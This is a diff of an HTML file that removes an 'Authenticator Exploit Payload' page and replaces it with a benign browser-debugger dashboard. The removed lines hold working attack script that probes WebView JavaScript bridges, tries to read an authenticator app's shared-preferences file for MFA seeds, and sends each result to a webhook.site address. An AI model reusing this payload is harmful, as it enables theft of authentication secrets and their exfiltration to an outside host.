@@ -1,68 +1,457 @@
+
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Authenticator Exploit Payload</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Browser Debugger</title>
+
+<style>
+* { box-sizing: border-box; }
+
+body {
+    margin: 0;
+    background: #0b1020;
+    color: #e5e7eb;
+    font-family: system-ui, sans-serif;
+}
+
+header {
+    padding: 16px 22px;
+    background: #111827;
+    border-bottom: 1px solid #293449;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+header h2 { margin: 0; font-size: 19px; }
+
+main {
+    max-width: 1400px;
+    margin: auto;
+    padding: 18px;
+}
+
+.toolbar {
+    display: flex;
+    gap: 8px;
+    margin-bottom: 12px;
+}
+
+input {
+    flex: 1;
+    min-width: 0;
+    background: #111827;
+    color: white;
+    border: 1px solid #374151;
+    border-radius: 7px;
+    padding: 12px;
+    outline: none;
+}
+
+button {
+    padding: 10px 15px;
+    border: 0;
+    border-radius: 7px;
+    cursor: pointer;
+    color: white;
+    background: #2563eb;
+    font-weight: 600;
+}
+
+button.secondary { background: #374151; }
+button.danger { background: #991b1b; }
+
+.browser {
+    height: 430px;
+    background: white;
+    border-radius: 9px;
+    overflow: hidden;
+}
+
+iframe {
+    width: 100%;
+    height: 100%;
+    border: 0;
+    background: white;
+}
+
+.status {
+    font-size: 12px;
+    color: #9ca3af;
+    margin: 10px 0 18px;
+}
+
+.console {
+    background: #080d18;
+    border: 1px solid #293449;
+    border-radius: 9px;
+    overflow: hidden;
+}
+
+.console-header {
+    display: flex;
+    justify-content: space-between;
+    padding: 13px;
+    background: #111827;
+    align-items: center;
+}
+
+.tabs {
+    display: flex;
+    gap: 15px;
+    font-size: 13px;
+}
+
+.tab {
+    cursor: pointer;
+    color: #9ca3af;
+}
+
+.tab.active { color: #60a5fa; }
+
+#logs {
+    height: 240px;
+    overflow: auto;
+    padding: 12px;
+    font-family: monospace;
+    font-size: 12px;
+}
+
+.log {
+    padding: 8px;
+    border-bottom: 1px solid #1f2937;
+    overflow-wrap: anywhere;
+}
+
+.error { color: #f87171; }
+.warning { color: #fbbf24; }
+.info { color: #60a5fa; }
+.success { color: #4ade80; }
+
+.stats {
+    display: flex;
+    gap: 12px;
+    margin: 14px 0;
+    flex-wrap: wrap;
+}
+
+.stat {
+    background: #111827;
+    border: 1px solid #293449;
+    border-radius: 8px;
+    padding: 12px 16px;
+    min-width: 110px;
+    flex: 1;
+}
+
+.stat strong {
+    display: block;
+    font-size: 22px;
+}
+
+.stat small { color: #9ca3af; }
+
+@media(max-width:600px) {
+    .toolbar { flex-wrap: wrap; }
+    .toolbar input { flex-basis: 100%; }
+    .browser { height: 350px; }
+}
+</style>
 </head>
+
 <body>
-    <h2>WebView Enumeration</h2>
-    <div id="output" style="word-wrap: break-word; font-family: monospace; font-size: 12px;"></div>
 
-    <script>
-        function log(msg) {
-            document.getElementById("output").innerHTML += msg + "<br><br>";
-            // Also send it back to your Burp Collaborator / Webhook for easy reading
-            fetch("https://webhook.site/7ceb0796-94e1-402b-a8d9-d0eafe9dbf45?data=" + encodeURIComponent(msg));
+<header>
+    <h2>🔍 Browser Debugger</h2>
+    <span style="color:#4ade80;font-size:12px">
+        ● Local session
+    </span>
+</header>
+
+<main>
+
+    <div class="toolbar">
+        <input id="url" placeholder="https://example.com"
+        value="https://example.com">
+
+        <button onclick="navigate()">Go</button>
+        <button class="secondary" onclick="reload()">↻</button>
+    </div>
+
+    <div class="browser">
+        <iframe id="browser"
+        title="Embedded debugging browser"
+        sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-popups-to-escape-sandbox"
+        referrerpolicy="no-referrer">
+        </iframe>
+    </div>
+
+    <div class="status" id="status">
+        Waiting for navigation...
+    </div>
+
+    <div class="stats">
+        <div class="stat">
+            <strong id="errorCount" class="error">0</strong>
+            <small>Errors</small>
+        </div>
+
+        <div class="stat">
+            <strong id="warningCount" class="warning">0</strong>
+            <small>Warnings</small>
+        </div>
+
+        <div class="stat">
+            <strong id="infoCount" class="info">0</strong>
+            <small>Events</small>
+        </div>
+    </div>
+
+    <section class="console">
+        <div class="console-header">
+            <strong>Diagnostic Console</strong>
+
+            <div>
+                <button class="secondary"
+                onclick="exportLogs()">Export JSON</button>
+
+                <button class="danger"
+                onclick="clearLogs()">Clear</button>
+            </div>
+        </div>
+
+        <div class="console-header">
+            <div class="tabs">
+                <span class="tab active"
+                onclick="filterLogs('all',this)">All</span>
+
+                <span class="tab"
+                onclick="filterLogs('error',this)">Errors</span>
+
+                <span class="tab"
+                onclick="filterLogs('warning',this)">Warnings</span>
+
+                <span class="tab"
+                onclick="filterLogs('info',this)">Events</span>
+            </div>
+        </div>
+
+        <div id="logs">
+            <div class="log info">
+                Browser debugger initialized.
+            </div>
+        </div>
+    </section>
+
+</main>
+
+<script>
+const frame = document.getElementById("browser");
+const urlInput = document.getElementById("url");
+const logsElement = document.getElementById("logs");
+
+let logs = [];
+let activeFilter = "all";
+let currentURL = "";
+
+function addLog(type, message, details = {}) {
+
+    const entry = {
+        timestamp: new Date().toISOString(),
+        type,
+        message: String(message),
+        url: currentURL,
+        details
+    };
+
+    logs.push(entry);
+
+    if (logs.length > 5000) logs.shift();
+
+    updateStats();
+    renderLogs();
+}
+
+function updateStats() {
+    document.getElementById("errorCount").textContent =
+        logs.filter(x => x.type === "error").length;
+
+    document.getElementById("warningCount").textContent =
+        logs.filter(x => x.type === "warning").length;
+
+    document.getElementById("infoCount").textContent =
+        logs.filter(x => x.type === "info" || x.type === "success").length;
+}
+
+function renderLogs() {
+
+    logsElement.replaceChildren();
+
+    const visible = logs.filter(log =>
+        activeFilter === "all" || log.type === activeFilter
+    );
+
+    visible.forEach(log => {
+
+        const div = document.createElement("div");
+        div.className = "log " + log.type;
+
+        const time = new Date(log.timestamp)
+            .toLocaleTimeString();
+
+        div.textContent =
+            `[${time}] [${log.type.toUpperCase()}] ${log.message}`;
+
+        logsElement.appendChild(div);
+    });
+
+    logsElement.scrollTop = logsElement.scrollHeight;
+}
+
+function filterLogs(type, element) {
+    activeFilter = type;
+
+    document.querySelectorAll(".tab").forEach(tab =>
+        tab.classList.remove("active")
+    );
+
+    element.classList.add("active");
+    renderLogs();
+}
+
+function navigate() {
+
+    let value = urlInput.value.trim();
+
+    if (!value) return;
+
+    if (!/^https?:\/\//i.test(value)) {
+        value = "https://" + value;
+    }
+
+    let parsed;
+
+    try {
+        parsed = new URL(value);
+        if (!["http:", "https:"].includes(parsed.protocol)) {
+            throw new Error("Only HTTP and HTTPS URLs are allowed.");
         }
+    } catch (error) {
+        addLog("error", "Invalid URL: " + error.message);
+        return;
+    }
 
-        // 1. HUNT FOR JAVASCRIPT BRIDGES (Tokens)
-        log("<b>--- 1. JavaScript Interfaces ---</b>");
-        let foundInterfaces = [];
-        for (let prop in window) {
-            // Filter out standard browser properties to find custom injected objects
-            if (!window.hasOwnProperty || window.hasOwnProperty(prop)) {
-                if (typeof window[prop] === 'object' && prop !== 'window' && prop !== 'document' && prop !== 'location' && prop !== 'chrome') {
-                    // Common Microsoft JS bridge names
-                    if(prop.toLowerCase().includes('external') || 
-                       prop.toLowerCase().includes('msa') || 
-                       prop.toLowerCase().includes('auth') || 
-                       prop.toLowerCase().includes('broker')) {
-                        foundInterfaces.push(prop);
-                        log("<b>Found potential JS Bridge:</b> window." + prop);
-                        
-                        // Enumerate methods on the bridge
-                        try {
-                            let methods = Object.getOwnPropertyNames(Object.getPrototypeOf(window[prop]));
-                            log("Methods: " + methods.join(", "));
-                        } catch(e) {}
-                    }
-                }
-            }
-        }
-        if (foundInterfaces.length === 0) log("No custom JS interfaces found on window object.");
+    currentURL = parsed.href;
 
-        // 2. CHECK FOR LOCAL FILE ACCESS (MFA Seed Theft)
-        log("<b>--- 2. Local File Access ---</b>");
-        try {
-            var xhr = new XMLHttpRequest();
-            // Try to read the Android manifest or shared prefs
-            xhr.open("GET", "file:///data/data/com.azure.authenticator/shared_prefs/com.azure.authenticator_preferences.xml", true);
-            xhr.onload = function () {
-                if (xhr.status === 0 || xhr.status === 200) {
-                    log("<b>CRITICAL: LOCAL FILE READ ENABLED!</b><br>" + xhr.responseText.substring(0, 100) + "...");
-                }
-            };
-            xhr.onerror = function() {
-                log("Local file read blocked (CORS/FileAccess disabled).");
-            };
-            xhr.send();
-        } catch (e) {
-            log("Local file read error: " + e.message);
-        }
+    addLog("info", "Navigation started: " + currentURL);
 
-        // 3. CHECK USER AGENT (To see if app appended custom identity strings)
-        log("<b>--- 3. User Agent ---</b>");
-        log(navigator.userAgent);
-    </script>
+    document.getElementById("status").textContent =
+        "Loading: " + currentURL;
+
+    try {
+        frame.src = currentURL;
+    } catch (error) {
+        addLog("error", error.message);
+    }
+}
+
+function reload() {
+    try {
+        frame.contentWindow.location.reload();
+    } catch {
+        frame.src = currentURL;
+    }
+
+    addLog("info", "Reload requested");
+}
+
+frame.addEventListener("load", () => {
+
+    addLog("success", "Iframe load event fired");
+
+    document.getElementById("status").textContent =
+        "Load event fired. Cross-origin diagnostics may be restricted.";
+
+    try {
+
+        const win = frame.contentWindow;
+
+        // This works only when the iframe is same-origin.
+
+        win.addEventListener("error", event => {
+            addLog("error", event.message || "JavaScript error", {
+                filename: event.filename,
+                line: event.lineno,
+                column: event.colno
+            });
+        });
+
+        win.addEventListener("unhandledrejection", event => {
+            addLog("error", "Unhandled promise rejection", {
+                reason: String(event.reason)
+            });
+        });
+
+        const originalError = win.console.error;
+        const originalWarn = win.console.warn;
+
+        win.console.error = function(...args) {
+            addLog("error", args.map(String).join(" "));
+            originalError.apply(win.console, args);
+        };
+
+        win.console.warn = function(...args) {
+            addLog("warning", args.map(String).join(" "));
+            originalWarn.apply(win.console, args);
+        };
+
+        addLog("success", "Same-origin instrumentation attached");
+
+    } catch (error) {
+        addLog("warning",
+            "Cross-origin access blocked. Internal page logs unavailable.");
+    }
+});
+
+window.addEventListener("error", event => {
+    addLog("error", event.message || "Dashboard JavaScript error");
+});
+
+window.addEventListener("unhandledrejection", event => {
+    addLog("error", "Dashboard promise rejection: " +
+        String(event.reason));
+});
+
+function clearLogs() {
+    logs = [];
+    updateStats();
+    renderLogs();
+}
+
+function exportLogs() {
+
+    const blob = new Blob(
+        [JSON.stringify(logs, null, 2)],
+        {type: "application/json"}
+    );
+
+    const link = document.createElement("a");
+
+    link.href = URL.createObjectURL(blob);
+    link.download = "browser-debug-logs.json";
+    link.click();
+
+    URL.revokeObjectURL(link.href);
+}
+
+urlInput.addEventListener("keydown", event => {
+    if (event.key === "Enter") navigate();
+});
+
+navigate();
+</script>
+
 </body>
 </html>
